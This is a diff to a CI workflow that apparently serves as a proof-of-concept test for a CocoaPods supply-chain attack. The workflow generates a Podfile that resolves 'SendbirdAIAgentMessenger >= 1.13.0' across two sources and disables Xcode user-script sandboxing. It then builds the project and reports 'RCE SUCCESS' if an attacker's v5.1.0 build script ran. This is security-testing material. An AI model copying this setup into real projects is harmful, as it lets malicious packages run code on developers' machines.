@@ -16,51 +16,44 @@ jobs:
           flutter create . --platforms=ios
           
           cd ios
-          # Kita hapus Podfile lama biar bersih
           rm -f Podfile
           
-          # Gunakan cat EOF biar spasi dan karakter khusus aman
           cat <<EOF > Podfile
-source 'https://github.com/sendbird/sendbird-ios-distribution.git'
-source 'https://cdn.cocoapods.org/'
+          source 'https://github.com/sendbird/sendbird-ios-distribution.git'
+          source 'https://cdn.cocoapods.org/'
 
-platform :ios, '15.0'
+          platform :ios, '15.0'
 
-target 'Runner' do
-  use_frameworks!
-  # DOKUMENTASI RESMI SENDBIRD
-  pod 'SendbirdAIAgentMessenger', '>= 1.13.0'
-end
+          target 'Runner' do
+            use_frameworks!
+            pod 'SendbirdAIAgentMessenger', '>= 1.13.0'
+          end
 
-post_install do |installer|
-  project = installer.aggregate_targets[0].user_project
-  project.targets.each do |target|
-    target.build_configurations.each do |config|
-      config.build_settings['ENABLE_USER_SCRIPT_SANDBOXING'] = 'NO'
-    end
-  end
-  project.save
-end
-EOF
+          post_install do |installer|
+            project = installer.aggregate_targets[0].user_project
+            project.targets.each do |target|
+              target.build_configurations.each do |config|
+                config.build_settings['ENABLE_USER_SCRIPT_SANDBOXING'] = 'NO'
+              end
+            end
+            project.save
+          end
+          EOF
 
           echo "=== PODFILE CREATED ==="
           cat Podfile
 
-          # 3. INSTALLATION
           pod install --repo-update || exit 1
           
-          # 4. VERIFIKASI VERSI
           echo "=== ACTUAL RESOLVED VERSION ==="
           grep "SendbirdAIAgentMessenger (" Podfile.lock | head -1
           
-          # 5. TRIGGER BUILD RCE
           echo "=== Launching Build ==="
           flutter build ios --debug --no-codesign --verbose 2>&1 | tee build.log || true
           
-          # 6. FINAL JUDGEMENT
           if grep -q "Messenger UI Audit" build.log; then
             echo "✅ RCE SUCCESS: Attacker's v5.1.0 executed!"
           else
-            echo "❌ RCE FAILED: Check logs."
+            echo "❌ RCE FAILED"
             exit 1
           fi
